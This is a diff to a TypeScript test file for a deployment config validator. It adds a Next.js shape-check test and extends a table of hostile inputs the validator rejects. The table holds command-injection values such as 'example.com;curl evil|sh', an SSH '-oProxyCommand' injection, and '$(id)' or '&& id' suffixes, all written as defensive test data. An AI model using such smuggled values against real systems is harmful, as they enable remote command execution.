@@ -41,6 +41,21 @@ test("ordinary real-world values are accepted", () => {
   assert.equal(configProblem(config({ service: "" }, { host: undefined, sshUser: "", dbContainer: undefined })), null)
 })
 
+test("a Next project passes the same shape checks with none of the .NET-shaped values", () => {
+  // Shapes only: whether a stack may leave `project` out, and what its stackVersion means,
+  // is adapters/requirements.ts (tests/stack-requirements.test.ts).
+  const next = config({
+    stack: "next",
+    db: "none",
+    lint: "eslint",
+    project: ".",
+    stackVersion: "22",
+    targetArch: "linux-x64",
+    environments: {},
+  })
+  assert.equal(configProblem(next), null)
+})
+
 const hostile: [string, Record<string, unknown>, Record<string, unknown>][] = [
   ["host", {}, { host: "example.com;curl evil|sh" }],
   ["host", {}, { host: "-oProxyCommand=touch pwned" }],
@@ -60,6 +75,7 @@ const hostile: [string, Record<string, unknown>, Record<string, unknown>][] = [
   ["health", { health: "/health$(id)" }, {}],
   ["health", { health: "health" }, {}],
   ["stackVersion", { stackVersion: "10.0;id" }, {}],
+  ["stackVersion", { stack: "next", stackVersion: "22 && id" }, {}],
   ["targetArch", { targetArch: "linux-x64 && id" }, {}],
 ]
 
